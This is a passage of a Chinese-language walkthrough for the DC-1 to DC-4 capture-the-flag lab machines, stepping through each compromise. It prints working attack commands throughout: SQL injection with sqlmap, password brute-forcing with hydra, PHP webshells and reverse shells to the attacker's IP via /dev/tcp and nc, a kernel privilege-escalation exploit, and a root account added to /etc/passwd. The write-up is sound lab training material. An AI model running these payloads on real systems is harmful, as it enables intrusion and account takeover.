-pR0ck3t\n*注意这里-u和-p后面没有空格，有空格会报错\n\n先看看数据库\n\n\n\n\n\n\n\n\n\n输入show databases;\n\n查看drupaldb库里的表\n\n\n\n\n\n\n\n\n\n输入use drupaldb;然后输入show tables;\n\n看到users表，这就是我们登录成功的关键，查看该表\n\n发现有两个用户，我们的目的是修改或者获得admin用户的密码，当然也可以再创建一个用户，但是都需要加密\n\n\n\n\n\n\n\n\n\n因为这里我们可以发现用户的密码是被加密了的，那加密文件肯定是在脚本目录里，也就是scripts目录里，利用加密脚本，把我们的密码加密，然后更新数据库里admin用户原本的密码\n我们来找找密码加密脚本在哪里\n\n看到scripts目录\n进入查看\n\n\n\n\n\n\n\n\n\n输入cd scripts;ls -a\n\n发现有一个password-hash.sh文件，密码就是通过它进行hash加密的\n运行它，让它把我们的密码加密\n\n\n\n\n\n\n\n\n\n输入./password-hash.sh  123456\n\n但是运行可能会出现如下错误，如果没有请忽略\n\n报错说\n\n\n\n\n\n\n\n\n\ninclude_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory \n也就是找不到该文件，但是发现，includes目录确实也不在scripts目录下，于是用cp把includes目录放到scripts目录下即可\n\n\n\n\n\n\n\n\n\n输入cp -r ../includes ./\n\n得到加密数据\n\n再次进入mysql数据库，修改 admin密码\nupdate users set pass=\"$S$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x\" where name=\"admin\"\n\n\n我们试试能不能登录\n\n\n\n\n\n\n\n\n\n用户名：admin\n密码：123456\n登录成功\n\n得到flag3\n\n2）利用drupal脚本添加管理员用户优点是更加方便，快捷，但是脚本不是万能的，只有自己明白原理才是真正掌握，这个的本质也是利用sql注入\nhttps://www.exploit-db.com/exploits/34992\n\n该网站在kali里面浏览器书签自带的，这个脚本适用于drupal，直接下载下来用即可\n\n下载好后，运行\npython2 34992.py -t http://192.168.133.136 -u admin001 -p 123456\n\n\n\n\n\n\n\n\n\n\n-t就是目标网站，-u就是新建的用户名，-p就是用户名密码*注意这个脚本需要 python2运行，python3语法不符合\n\n然后按照输入的，直接登录就可以了，或者直接点击下面链接\n\n就可以拿到Flag3\n\n\nFlag41）个人方法分析一下flag3\n\n\n\n\n\n\n\n\n\nSpecial PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.\n意思是：Special PERMS特别的权限（应该是root权限），passwd应该是查看&#x2F;etc&#x2F;passwd目录，FIND意思利用find命令，-exec就是需要用它执行命令， get what’s in the shadow意思是flag4在&#x2F;etc&#x2F;shadow里\n我们先看看etc目录\n\n发现了passwd文件\n\n\n\n\n\n\n\n\n\n输入cat passwd\n查看一下内容\n发现有flag4的线索\n\nflag4是在/home/flag4里面，我们到目录里看看\n\n\n\n\n\n\n\n\n\n输入cd /home/flag4\n发现有个flag4.txt，查看\n\n得到flag4\n2）官方方法用了hydra[九头蛇]工具，对我们在passwd里看到flag4用户进行爆破\nhydra -l flag4 -p /usr/share/wordlists/rockyou.txt.gz 192.168.133.136 -vV -f\n\n\n\n\n\n\n\n\n\n\n-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是用户所在的网站\n上面-p的文件是自己下载的密码包\n\n这里就看到flag4用户的密码被爆破出来，是orange\n然后用ssh连接\n\n\n\n\n\n\n\n\n\n输入ssh flag4@192.168.133.136然后yes然后输入密码：orange\n进入flag4用户页面，\n\n\n\n\n\n\n\n\n\n输入cat flag4.txt得到flag4\n\n\nFlag5\n\n\n\n\n\n\n\n\n分析一下flag5Can you use this same method to find or access the flag in root?\nProbably. But perhaps it&#39;s not that easy.  Or maybe it is?\n意思是：您可以使用相同的方法查找或访问根目录中的标志吗？\n可能但也许这并不容易。也许是这样？\nroot应该就是需要提权了\nsuid提权linux提权操作可以看一下我的WEB随笔里suid提权，下面只记录流程\n\n\n\n\n\n\n\n\n\n输入find / -perm -u=s -type f 2&gt;/dev/null，查看目录下suid权限所有可执行二进制文件\n发现find目录\n\n于是可以利用find获取root权限shell\n主要是要让find命令成功执行，找一个存在的文件即可\n\n\n\n\n\n\n\n\n\n以在根目录为例输入find / -name initrd.img -exec &quot;/bin/sh&quot; \\;\n提权成功\n\n我们在flag4里知道，最后的旗子在root目录里\n\n\n\n\n\n\n\n\n\n输入cd /root;ls -a\n发现thefinalflag.txt\n\n\n\n\n\n\n\n\n\n\nWell done!!!!\nHopefully you&#39;ve enjoyed this and learned some new skills.\nYou can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7意思是：做得好！！！！\n希望你喜欢这一点，并学习了一些新技能。\n你可以告诉我你对这次小旅行的看法通过Twitter联系我-@DCAU7 \n5个旗子找完，游戏结束\n\n二、DC-2[初级]five flags\n信息收集 先用nmap扫描一些\n\n\n\n\n\n\n\n\n\n输入nmap -p- 192.168.133.138\n发现内容太少了\n\n\n\n\n\n\n\n\n\n\n输入nmap -p- 192.168.133.138 -A\n\n发现7744端口运行的ssh，22端口被换了\n\n\n\n\n\n\n\n\n\nSsh是一个安全的远程登录协议,它的端口号默认是22端口\n\n\n\n\n\n\n\n\n\nSSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。\n我们试试访问我们的靶机ip：192.168.133.138\n\n但是访问失败【如果没有问题，可以忽略】\n\n可以看到，访问IP的时候进行了一个跳转，跳转到了http://dc-2，且无法访问\n我猜测是hosts文件没有修改，所以域名无法登录\n需要在hosts其中添加域名：http://dc-2和其ip：192.168.133.138，dns才能正常转换\n\n\n\n\n\n\n\n\n\n输入vi /etc/hosts\n\n向其中添加\n192.168.133.138 dc-2\n\n\n刷新浏览器，再次访问192.168.133.138或http://dc-2\n\n成功连接\n\nFlag1进入网页就看到flag了\n\n点击打开查看\n\n\n\n\n\n\n\n\n\n\nFlag 1:\nYour usual wordlists probably won’t work, so instead, maybe you just need to be cewl.\nMore passwords is always better, but sometimes you just can’t win them all.\nLog in as one to see the next flag.\nIf you can’t find it, log in as another.\n意思是：你通常的密码表可能不起作用，因此，也许你只需要成为cewl。\n密码越多越好，但有时你无法赢得所有密码。\n作为一个登录以查看下一个标志。\n如果找不到，请作为另一个登录\n·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。\n那我们就用cewl工具试一下*不会工具一般用-h就可以知道使用说明\n\nFlag2根据flag1，我们用cewl试试生成字典\ncewl\n\n\n\n\n\n\n\n\n输入cewl http://dc-2/ &gt;pass.txt\n\n目录下就会生成pass.txt\n\n\n\n\n\n\n\n\n\n输入cat pass.txt，查看内容\n\n发现是生成对应网站的密码字典\nflag1整理信息好像差不多了，下面我们利用dc1提到的wappalyzer，查看一下网页的框架结构有没有什么线索\n\n发现网站的CMS是WordPress，还可以看到它的主题是Twenty Seventeen\n那wordpress，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具\nwpscan\n\n\n\n\n\n\n\n\nWPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞\n于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下\n\n\n\n\n\n\n\n\n\n输入wpscan --url http://dc-2 -e u\n\n然后往下看用户名\n\n发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的pass.txt这个密码本一样\n\n\n\n\n\n\n\n\n\n输入vi un.txt\n把admin jerry tom复制进去\n\n然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了\n\n\n\n\n\n\n\n\n\n输入wpscan --url http://dc-2 -P pass.txt -U un.txt\n\n稍微等一会\n\nadmin用户密码没有找到，应该是最高权限的账号\n但是jerry和tom用户的密码已经知道了\n下面，我们就要开始找登录的页面了，一般是后台网站\n我们可以用dirsearch工具进行扫描看看\n\n发现网站\n\n用我们之前获得的用户名和密码登录试试\n以jerry为例，好像用tom会显示密码错误\n在page窗口发现flag2\n\n点开查看，得到flag2\n\n\n\n\n\n\n\n\n\n\nFlag 2:\nIf you can&#39;t exploit WordPress and take a shortcut, there is another way.\nHope you found another entry point.意思是：如果你不能利用WordPress并走捷径，还有另一种方法。\n希望你能找到另一个切入点。 \n\nFlag3根据flag2的提示，实际上就是说从wordpress这条路是行不通的，要从另外的方向\n但是如果wordpress行不通，而这个网站就是wordpress搭建起来的，那么这个网站的就不能下手\n虽然网站的80端口的http行不通\n但是我们之前用nmap扫了一下，发现端口7744运行着ssh，那我们能不能利用ssh登录成功呢\n\n我们先用之前用过的工具hydra进行爆破一下，看看这个ssh的用户是谁\n\n\n\n\n\n\n\n\n\n输入hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744\n\n发现tom账号是在这里登录\n\n输入ssh tom@192.168.133.138 -p 7744\n\n\n登录成功后，ls发现flag3.txt\n\n\n\n\n\n\n\n\n\n输入cat flag3.txt，查看内容\n\n发现没有该命令，那就可能是没有权限执行这个命令了\nrbash看到rbash，不认识，查一下\n\n\n\n\n\n\n\n\n\nrbash它与一般shell的区别在于会限制一些行为，让一些命令无法执行\n看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过ls，所以ls可以使用\n\n\n\n\n\n\n\n\n\n输入ls /home/tom/usr/bin   \n&#x2F;&#x2F;查看rbash设置的可执行的命令\n\n我们可以看到我们可以利用\nless ls scp vi\n\n关键是vi的命令\n*vi绕过-&gt;rbash逃逸可以进入vi中，执行set命令，把shell改为/bin/sh\n\n\n\n\n\n\n\n\n\n 先输入vi，进入vi\n\n然后\n\n\n\n\n\n\n\n\n\n直接输入，不用按i:set shell=/bin/sh    &#x2F;&#x2F;给shell赋值回车:shell                &#x2F;&#x2F;执行shell回车，就退回主界面来了\n\n这样我们就完成了逃逸\n之前因为我们受限于rbash，不能执行cd等命令\n\n现在执行试试\n\n就没有阻止了\n我们再试试cat\n\n发现cat命令找不到，但是我们已经绕过了rbash，所以只能是其他原因，最有可能就是cat的环境没有设置到当前位置\n\n\n\n\n\n\n\n\n\n输入echo $PATH这是显示当前环境变量，可能cat并没有被设置到当前的环境变量所以无法执行\n\n*设置全局变量\n\n\n\n\n\n\n\n\n于是我们来设置全局变量,终端输入export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin\n这样我们执行cat就不会只在/home/tom/usr/bin里面寻找了，会在很多目录里寻找\n\n\n\n\n\n\n\n\n\n输入\ncd tomlscat flag3.txt得到flag3\n\n\n\n\n\n\n\n\n\n\nPoor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.意思是：\n可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。\n但是看到了su，也就是需要切换用户\n\nFlag4根据flag3，我们可以知道需要用su命令切换用户到jerry\n\n\n\n\n\n\n\n\n\n输入su jerry和其密码adipiscing\n\n然后切换到jerry目录，发现flag4.txt\n\n\n\n\n\n\n\n\n\n\nGood to see that you&#39;ve made it this far - but you&#39;re not home yet. \nYou still need to get the final flag (the only flag that really counts!!!).  \nNo hints here - you&#39;re on your own now.  :-)\nGo on - git outta here!!!!意思是：很高兴看到你走了这么远，但你还没回家。你仍然需要得到最后的标志（唯一真正重要的标志！！！）。这里没有提示-你现在只能靠自己了。：-）\n去吧-滚出去！！！！\n看到git，就是提示我们用git命令\n\nFlag5*git缓存区溢出漏洞\n\n\n\n\n\n\n\n\n输入sudo -l&#x2F;&#x2F;列出目前用户可执行与无法执行的指令。\n\n就可以发现root以nopasswd【不需要密码】运行git命令\n原理是git存在缓存区溢出漏洞，\n在使用\nsudo git -p\n\n不需要输入root密码，即可以root身份执行这条命令\n操作如下\n\n\n\n\n\n\n\n\n\nsudo git -p    \n&#x2F;&#x2F;-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令\n下面可以看看区别\n*注意窗口大小1.窗口足够大\n可以看到显示完了，就又回到原处了【不行】\n2.窗口小一些\n下方就显示出:，等待输入\n\n\n\n\n\n\n\n\n\n冒号:是自带有的，不是输入的:!/bin/sh\n&#x2F;&#x2F;感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git进入root\ncd /root\n当然也可以执行:!passwd root修改其密码然后su root登录也可\n法 1.执行命令，拿到root的shell$变成#成功\n\n法 2.修改密码，登录\n$变成#，成功登录\n\n然后到/root目录下，找到最后的 flag\n\n__    __     _ _       _                    _ \n/ / /\\ \\ \\___| | |   __| | ___  _ __   ___  / \\\n\\ \\/  \\/ / _ \\ | |  / _` |/ _ \\| &#x27;_ \\ / _ \\/  /\n \\  /\\  /  __/ | | | (_| | (_) | | | |  __/\\_/ \n  \\/  \\/ \\___|_|_|  \\__,_|\\___/|_| |_|\\___\\/   \n\n\n\n\n\n\n\n\n\n\n\nCongratulatons!!!\nA special thanks to all those who sent me tweetsand provided me with feedback - it&#39;s all greatlyappreciated.\nIf you enjoyed this CTF, send me a tweet via @DCAU7.意思是：\n恭喜！！！\n特别感谢所有给我发推文的人\n并向我提供了反馈-非常棒谢谢。\n如果您喜欢这个CTF，请通过@DCAU7给我发一条推文\n5个旗子找完，游戏结束\n\n三、DC-3[初级]only one flag\n信息收集【前面的靶机ip寻找，按之前的步骤即可】\n先用nmap扫一下我们的靶机ip\nnmap -p- 192.168.133.139\n\n\n看到只有80端口，运行着一个http服务，中间件为apache2.4.18\n内容管理系统（CMS）是joomla\n\n利用插件wappalyzer，也可以看到其CMS为joomla\n我们可以利用kali包当中自带的joomscan工具对其进行扫描\n\n\n\n\n\n\n\n\n\n漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。还能够以HTML或文本格式导出扫描报告。\n【没有的，可能需要更新包，然后直接下载即可】\n\n\n\n\n\n\n\n\n\n\n输入joomscan -u 192.168.133.139\n\n扫描发现了，管理员的登录网址http://192.168.133.139/administrator/\n\n但是不知道用户名和密码\n\n发现其joomla版本为3.7.0\n\n但我们并不知道该版本有哪些漏洞，所以需要用到 kali的Exploit-DB工具\n可以在浏览器里的Exploit-DB网址进行查询【不过因为是国外网址有点卡】\n\n然后寻找下载payload\n\n也可以在终端输入命令查询【也是基于Exploit-DB的命令行搜索工具,可以帮助我们查找渗透模块】\n\n\n\n\n\n\n\n\n\n输入searchsploit joomla 3.7.0\n\n可以看到joomla 3.7.0版本存在sql注入的漏洞\n 然后查看Path\n\n\n\n\n\n\n\n\n\n输入searchsploit -p 42033\n\nPath就是该漏洞利用方法的文本地址\n\n\n\n\n\n\n\n\n\n输入cat /usr/share/exploitdb/exploits/php/webapps/42033.txt\n\n可以看到该漏洞的测试平台，时间，还有漏洞的CVE编号\n关键在它给出的sqlmap注入的模板\n\n\n\n\n\n\n\n\n\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n&#x2F;&#x2F;把localhost改成靶机ip即可\n\n运行\n\n发现了靶机下的数据库，我们所需要的就是joomladb\n\n\n\n\n\n\n\n\n\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables\n&#x2F;&#x2F;在原有的payload后加上-D joomladb，选定数据库&#x2F;&#x2F;再在后面加上–tables，输出该数据库的表\n\n然后可以看到#__users的表，里面很可能有线索\n\n\n\n\n\n\n\n\n\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns\n&#x2F;&#x2F;和上一步类似，但注意表名有#，所以需要用引号框起来，不然后面语句全被注释了&#x2F;&#x2F;*注，sqlmap提示按默认推荐就好\n\n看到username和password，查看列里内容\n\n\n\n\n\n\n\n\n\nsqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump&#x2F;&#x2F;dump获取字段中的数据\n\n得到用户名和密码\n但是密码被加密了，那就只能用一些工具进行解密\n先生成一个加密密码的文本文件\n\n\n\n\n\n\n\n\n\n输入vi passwd.txt然后把加密数据复制进去$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu\n\njohn然后我们就需要用一个解密工具john\nJohn是一个破解系统密码的工具\n使用很简单\n\n\n\n\n\n\n\n\n\n输入john passwd.txt\n&#x2F;&#x2F;后面接的是密码文本文件\n然后输入\n\n\n\n\n\n\n\n\n\njohn --show passwd.txt&#x2F;&#x2F;查看爆破成功的密码，发现爆破成功\n\n得到密码snoopy\n然后登录后台网址\n\n\n\n\n\n\n\n\n\n用户名：admin密码：snoopy\n\n登录成功，然后摸索分析一下网站\n然后在Extensions–&gt;Template\n\n\n发现有个new file，可以新建文件，那么我们也可以新建一个我们的木马文件，拿取靶机的shell\n后门生成，进入shell法1msfvenom\nmsf生成木马\n\n\n\n\n\n\n\n\n输入msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=4444 -f raw &gt; shell.php&#x2F;&#x2F;注意，LHOST是kali的ip\n\n\n\n\n\n\n\n\n\n\n输入ls\n\n发现目录下生成了 shell.php\n\n\n\n\n\n\n\n\n\n输入cat shell.php\n\n得到靶机对应的木马\n然后在网站新建一个php文件\n\n然后把木马内容导入进去\n\n 然后保存一下\n\n然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功\n因为我们文件是在/templates/protostar/下上传的，所以访问\nhttp://192.168.133.139/templates/protostar/1.php\n\n\n看到/*，看来是可以成功访问\nmsf利用木马然后用msf进行利用\n\n\n\n\n\n\n\n\n\n先输入msfconsole，进入msf\n\n\n\n\n\n\n\n\n\n然后输入use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp进入我们利用msf制作的木马利用环境\n\n\n\n\n\n\n\n\n\n\n输入show options看看需要填写什么\n\n看到LHOST监听的ip没有填写\n\n\n\n\n\n\n\n\n\n输入set LHOST 192.168.133.140  &#x2F;&#x2F;kali的ip\n\n\n\n\n\n\n\n\n\n输入run，运行\n这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页\nhttp://192.168.133.139/templates/protostar/1.php\n\n\n然后输入\n\n\n\n\n\n\n\n\n\n输入shell\n然后输入python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;&#x2F;&#x2F;进入交互式shell，当然不嫌看着麻烦，也可以直接执行后面命令\n\n提权\n\n\n\n\n\n\n\n\n输入ls,简单看看文件\n\n\n\n\n\n\n\n\n\n\n输入uname -a查看系统版本\n\n看到unbuntu是2016年4月发布的，所以是unbuntu16.04\nlinux版本是4.4.0-21版\n所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权\n\n\n\n\n\n\n\n\n\n还是利用之前用过的searchsploit unbuntu 16.04\n\ndouble-fdput() ,这是运行可执行文件，即可获取root权限\n我们把它内容显示出来\n\n\n\n\n\n\n\n\n\n输入searchsploit -p 39772显示文本路径   cat /usr/share/exploitdb/exploits/linux/local/39772.txt 显示内容\n\n在最后看到该漏洞利用的exp下载链接\n\n下载最后一个链接的压缩包\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip\n\n然后在我们的网站后台上传上去，和创建木马文件时候一样\n\n结果报错了\n\n看来这个网站上传处是不能上传压缩包文件的\n所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具\n我们和之前一样新建一个php文件写上我们的一句话木马\n\n用蚁剑连接\nhttp://192.168.133.139/templates/protostar/123.php\n\n\n然后把我们的压缩包放在目录下\n\n然后返回msf\n\n\n\n\n\n\n\n\n\n输入ls\n\n发现压缩包已经在里面了\n然后解压缩\n\n\n\n\n\n\n\n\n\n输入unzip 39772.zip\n\n发现目录下多了个39772的目录\n\n\n\n\n\n\n\n\n\n输入cd 39772\n\n发现有两个压缩包，我们利用exploit.tar\n\n\n\n\n\n\n\n\n\n输入tar -xvf exploit.tar &#x2F;&#x2F;解压缩\n\n发现多了个ebpf_mapfd_doubleput_exploit目录\n输入cd ebpf_mapfd_doubleput_exploit\n\n\n发现有个compile.sh\n运行\n\n\n\n\n\n\n\n\n\n输入./compile.sh\n发现目录下有多了一个doubleput\n\n这就是提权文件，运行一下\n\n\n\n\n\n\n\n\n\n输入./doupleput\n\n输入whoami，看看提权成功没\n\n\n提权成功\n然后我们到/root目录下查看 flag\n\n\n\n\n\n\n\n\n\n\n\n\\ \\      / /__| | | |  _ \\  ___  _ __   ___| | | | |\n \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| &#x27;_ \\ / _ \\ | | | |\n  \\ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|\n   \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_)\n\nCongratulations are in order.  :-)\nI hope you&#39;ve enjoyed this challenge as I enjoyed making it.\nIf there are any ways that I can improve these little challenges,please let me know.\nAs per usual, comments and complaints can be sent via Twitter to @DCAU7\nHave a great day!!!!\n意思是：\n恭喜你，一切正常。：-）\n我希望你和我一样喜欢这个挑战。\n如果有任何方法可以改善这些小挑战，\n请让我知道。\n如往常一样，评论和投诉可以通过Twitter发送到@DCAU7\n祝你有美好的一天！！！！\n一个旗子找完，游戏结束\n法2反弹shell\n\n\n\n\n\n\n\n\n反弹shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。\n通俗点说，反弹shell就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。\n由于防火墙等限制，对方机器只能发送请求，不能接收请求\n对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。\n和法一一样，我们需要写一个反弹shell的php文件\n\n\n\n\n\n\n\n\n\n&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;\n&#x2F;&#x2F;注意这里的ip为kali的ip，8888为监听的端口\n\n\n\n\n\n\n\n\n\n\n输入nc -lnvp 8888开始监听然后访问456.phphttp://192.168.133.139/templates/protostar/456.php\n\n拿到shell，后面提权和法一\n一样\n法3weevely【提权没回显】\n\n\n\n\n\n\n\n\nWeevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具\n生成Shell\n\n\n\n\n\n\n\n\n\nweevely generate  &lt;文件名&gt;\nweevely generate 123456 shell.php\n把生成的内容，复制到我们创建的789.php文件里，和前面两个方法步骤一样\n利用触发shell\n\n\n\n\n\n\n\n\n\nweevely http://192.168.133.139/templates/protostar/789.php 123456\npython -m http.server 9999   \n\n成功进入shell\n但是当执行提权时\n\n报错无法提权，看来是被过滤啥的\n\n四、DC-4[初级]only one flag\n信息收集先看看靶机端口运行的服务\n\n发现有22和80端口，分别运行ssh和http\n我们先访问80端口\n\n\n\n\n\n\n\n\n\n访问ip：192.168.133.141\n\n是一个基本的登录窗口，有提示是admin用户登录界面，所以可能需要密码爆破登录\n我们再利用wappalyzer看一下网站一些基本信息\n\n没有啥有用的信息\n密码爆破然后我们就开始进行密码爆破\n已知用户名为admin，只用对密码爆破\n\n【字典可以自己找，当然也可以看我学习笔记写的网站下载】\n这里我用的top2000.txt\n最后爆破出密码为happy\n\n登录试试\n\n登录成功，进入Command\n\n点击run，就会显示上面的数据，看来是命令执行，但是它默认是ls -l，我们试试抓包能修改请求包里的命令吗\n\n发现是可以修改的，我们试试whoami命令，看看当前网站登录用户权限\n\n\n\n\n\n\n\n\n\n输入whoami\n\n发现是普通用户权限\n下面是两个getshell的思路\n\n1.\n后续查询操作，因为我们可以执行命令，所以也可以利用nc反弹shell，同样也可以找到用户目录信息\n\n\n\n\n\n\n\n\n\n终端输入nc -l -vv -p 8888，监听8888端口\n抓包数据命令修改为\n\n\n\n\n\n\n\n\n\nnc -nv 192.168.133.140 8888 -e /bin/bash   &#x2F;&#x2F;192.168.133.140是虚拟机ip，不是靶机ip\n然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些\n\n2.\n我们修改命令，查询/etc/passwd文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）\n\n\n\n\n\n\n\n\n\n输入cat+/etc/passwd\n\n发现有三个用户\n\n\n\n\n\n\n\n\n\ncharlesjimsam\n我们查看这几个用户的目录下有没有我们需要的信息\n先访问charles\n\n\n\n\n\n\n\n\n\n输入ls+-a+/home/charles\n\n感觉没啥有用的信息\n再看看jim\n\n\n\n\n\n\n\n\n\n输入ls+-a+/home/jim\n\n发现关键信息， backups目录和mbox目录，test.sh里面我看了，没啥有用的信息\n先看backups目录\n\n\n\n\n\n\n\n\n\n输入ls+-a+/home/jim/backups\n\n发现有个old-passwords.bak，这个可能就是登录这三个用户的关键\n查看一下内容\n\n\n\n\n\n\n\n\n\n输入cat+/home/jim/old-passwords.bak\n\n发现是一个密码表，复制到一个文本文件，当作爆破的密码表\nhydra对三用户进行ssh爆破我们已经有了密码表（pd.txt）,我们再把三个用户名写到另一个文档里（un.txt）\n因为之前我们扫描知道，22端口运行着ssh，而80端口我们已经访问了，所以下面端口写22\n于是\n\n\n\n\n\n\n\n\n\n输入hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22\n有点久，等一会就行\n\n得到jim用户的密码\n\n\n\n\n\n\n\n\n\njibril04\n然后我们登录ssh\n\n\n\n\n\n\n\n\n\n输入ssh jim@192.168.133.141 -p 22\n然后输入密码后，登录成功\n\n我们先看看我们能否执行一些管理员命令\n\n\n\n\n\n\n\n\n\n输入sudo -l\n\n发现jim用户不能执行任何管理员命令，所以不可能在jim用户上进行提权或其他后续操作\n我们仔细一些可以看到\n\n说我们有一封邮件，那我们就看看这封用邮件是什么\n但我们不知道mail在哪里\n\n\n\n\n\n\n\n\n\n输入find / -name mail\n\n找到位置/var/mail\n\n\n\n\n\n\n\n\n\n输入cd /var/mail;ls -a\n\n发现有一封名为jim的邮件，查看信息\n\n\n\n\n\n\n\n\n\n输入cat jim\n\n发现是charles发给jim的邮件\n\n\n\n\n\n\n\n\n\nHi Jim,\nI&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.\nPassword is:  ^xHhA&amp;hvim0y\nSee ya,Charles\n翻译：嗨，吉姆，\n我今天年底要放假，所以老板让我把密码给你，以防万一。\n密码是：^xHhA&amp;hvim0y\n再见，查尔斯\n信里提到他自己的密码\n\n\n\n\n\n\n\n\n\n^xHhA&amp;hvim0y\n于是我们就可以登录charles的账号，所以我们切换用户\n\n\n\n\n\n\n\n\n\n输入su charles\n然后输入密码后，登录成功\n\n先看看charles能执行什么管理员命令\n\n\n\n\n\n\n\n\n\n输入sudo -l\n\n发现charles可以执行管理员的teehee命令\nteehee我们先需要知道这个命令是干什么的\n\n\n\n\n\n\n\n\n\n输入teehee -h\n\n发现它是可以修改文件的数据，-a指令能够保证修改文件不会覆盖原有文件\n那我们需要管理员权限，就可以在/etc/passwd里面添加一个管理员用户数据\n添加管理员账户\n\n\n\n\n\n\n\n\n输入sudo teehee -a /etc/passwd\n\n然后就等待我们输入数据\n\n按照root用户格式，我们添加自己的数据\n\n\n\n\n\n\n\n\n\n输入ttoc:(这里是密码，可以加入自己的哈希后的密码，当然不加就可以直接登录，这里我不加，忽略):0:0:root:/root:/bin/bash\n\n添加成功，我们再看看能不能登录，是不是管理员\n\n发现是管理员，直接到root目录下，查看 flag即可\n\n\n\n\n\n\n\n\n\n\n888       888          888 888      8888888b.                             888 888 888 888 \n888   o   888          888 888      888  \"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"\"88b 888 \"88b d8P  Y8b 888 888 888 888 \n88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      \"   \"   \"   \"  \n888P     Y888  \"Y8888  888 888      8888888P\"   \"Y88P\"  888  888  \"Y8888  888 888 888 888\n\nCongratulations!!!\nHope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n意思是恭喜！！！\n希望你喜欢 DC-4。只是想向所有这些人表示衷心的感谢谁提供了反馈，谁花时间完成了这些小事挑战。\n如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。\n一个旗子找完，游戏结束\n\n五、DC-5[高级]only one 